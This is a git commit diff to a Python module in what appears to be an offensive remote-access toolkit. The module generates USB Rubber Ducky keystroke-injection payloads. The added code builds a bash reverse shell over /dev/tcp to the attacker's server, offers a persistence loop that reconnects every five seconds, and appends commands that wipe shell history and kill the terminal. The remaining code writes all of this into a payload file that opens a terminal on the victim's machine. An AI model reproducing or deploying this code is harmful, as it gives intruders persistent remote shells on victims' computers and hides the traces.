d854be3a8328fed54828c294941123dda9855cc9
Entynetproject <43011806+entynetproject@users.noreply.github.com>
2019-06-30 12:23:15 +0300

    Update rubber_duck_payload.py

--- modules/payloads/rubber_duck_payload.py
+++ modules/payloads/rubber_duck_payload.py
@@ -8,12 +8,24 @@ class payload:
 		self.usage = "Install via https://"
 		
 		def run(self,server):
-			if os.path.exists("payloads") == False:
-			        os.mkdir("payloads")
-		        if os.path.exists("payloads/rubber_duck") == False:
-			        os.mkdir("payloads/rubber_duck")
-		        payload_save_path = "payloads/rubber_duck/payload.txt"
-		        payload = """\
+		while 1:
+			persistence = raw_input(h.info_general_raw("Make Persistent? (y/N): ")).lower()
+			if persistence == "y":
+				shell_command = "while true; do $(bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
+				break
+			elif persistence == "n" or not persistence:
+				shell_command = "bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
+				break
+			else:
+				h.info_error("invalid option: " + persistence)
+
+		shell_command += "history -wc;killall Terminal"
+		if os.path.exists("payloads") == False:
+			os.mkdir("payloads")
+		if os.path.exists("payloads/rubber_duck") == False:
+			os.mkdir("payloads/rubber_duck")
+		payload_save_path = "payloads/rubber_duck/payload.txt"
+		payload = """\
     DELAY 10
     CTRL ALT T
     DELAY 10
